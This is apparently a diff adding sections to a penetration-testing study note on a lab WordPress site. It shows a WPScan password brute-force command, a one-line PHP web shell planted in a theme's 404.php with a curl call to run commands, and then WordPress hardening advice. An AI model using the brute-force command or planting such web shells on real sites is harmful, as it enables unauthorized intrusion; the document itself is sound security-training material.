@@ -362,3 +362,97 @@ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/co
 We have successfully validated the vulnerability using the data generated in the WPScan report.
 
 
+### WordPress user bruteforce
+
+WPScan can be used to brute force usernames and passwords. The scan report returned three users registered on the website: admin, roger, and david. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.
+
+```bash
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+```
+
+# RCE via theme editor
+
+With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack:
+- Log in to WordPress with the administrator credentials, which should redirect us to the admin panel;
+- Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly;
+- We should select an inactive theme in order to avoid corrupting the main theme.
+
+We can see that the active theme is Transportex so an unused theme such as Twenty Seventeen should be chosen instead.
+
+Choose a theme and click on Select. Next, choose a non-critical file such as 404.php to modify and add a web shell.
+
+Twenty Seventeen Theme - 404.php:
+
+```bash
+<?php
+
+system($_GET['cmd']);
+
+/**
+ * The template for displaying 404 pages (not found)
+ *
+ * @link https://codex.wordpress.org/Creating_an_Error_404_Page
+<SNIP>
+```
+
+The above code should allow us to execute commands via the GET parameter cmd. In this example, we modified the source code of the 404.php page and added a new function called system(). This function will allow us to directly execute operating system commands by sending a GET request and appending the cmd parameter to the end of the URL after a question mark ? and specifying an operating system command. The modified URL should look like this **404.php?cmd=id**.
+
+```bash
+curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
+```
+
+<br>
+<br>
+<br>
+<br>
+
+# WordPress hardening
+
+### Perform regular updates
+
+Make sure that WordPress core, as well as all installed plugins and themes, are kept up-to-date. The WordPress admin console will usually prompt us when plugins or themes need to be updated or when WordPress itself requires an upgrade. We can even modify the wp-config.php file to enable automatic updates by inserting the following lines: 
+
+```php
+define( 'WP_AUTO_UPDATE_CORE', true );
+```
+
+```php
+add_filter( 'auto_update_plugin', '__return_true' );
+```
+
+```php
+add_filter( 'auto_update_theme', '__return_true' );
+```
+
+### Enhance WordPress security
+
+There are a lot of security plugins for WP. These plugins can be used as a WAF, a malware scanner, activity auditing and so on.
+
+- Sucuri security: this plugin consist in the following features:
+  - Security activity auditing;
+  - File intigrity monitoring;
+  - Remote malware scanning;
+  - Blacklist monitoring.
+
+- IThemes Security: this plugin consist in a lot of features such as:
+  - 2FA;
+  - WordPress salts and security keys;
+  - Google reCAPTCHA;
+  - User action logging.
+
+- Wordfence security: consists of an endpoint firewall and malware scanner:
+  - The WAF identifies and blocks malicious traffic;
+  - The premium version provides real-time firewall rule and malware signature updates;
+  - Premium also enables real-time IP blacklisting to block all requests from known most malicious IPs.
+
+
+Users are often targeted as they are generally seen as the weakest link in an organization. The following user-related best practices will help improve the overall security of a WordPress site:
+- Disable the standard admin user and create accounts with difficult to guess usernames;
+- Enforce strong passwords;
+- Enable and enforce two-factor authentication for all users;
+- Restrict users' access based on the concept of least privilege;
+- Periodically audit user rights and access;
+- Limit login attempts to prevent password brute-forcing attacks;
+- Rename the wp-admin.php login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses.
+
+
